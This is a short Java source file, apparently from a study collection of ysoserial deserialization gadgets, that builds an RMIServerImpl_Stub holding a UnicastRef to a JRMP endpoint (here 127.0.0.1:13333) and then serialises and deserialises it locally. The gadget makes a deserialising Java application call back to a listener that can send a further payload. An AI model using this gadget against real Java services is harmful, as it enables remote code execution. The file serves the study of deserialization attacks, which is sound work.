package org.su18.serialize.ysoserial.RMI.RemoteObject;

import org.su18.serialize.utils.SerializeUtil;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import javax.management.remote.rmi.RMIServerImpl_Stub;
import java.rmi.server.ObjID;
import java.util.Random;

/**
 * @author su18
 */
public class RemoteObject1 {

	public static void main(String[] args) throws Exception {

		String host = "127.0.0.1";
		int    port = 13333;

		ObjID       id  = new ObjID(new Random().nextInt()); // RMI registry
		TCPEndpoint te  = new TCPEndpoint(host, port);
		UnicastRef  ref = new UnicastRef(new LiveRef(id, te, false));

		RMIServerImpl_Stub stub = new RMIServerImpl_Stub(ref);

		// ysoserial 中使用 RemoteObjectInvocationHandler
//		RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
//		Registry proxy = (Registry) Proxy.newProxyInstance(RemoteObject1.class.getClassLoader(), new Class[]{Registry.class}, obj);

		SerializeUtil.writeObjectToFile(stub);
		SerializeUtil.readFileObject();
	}

}
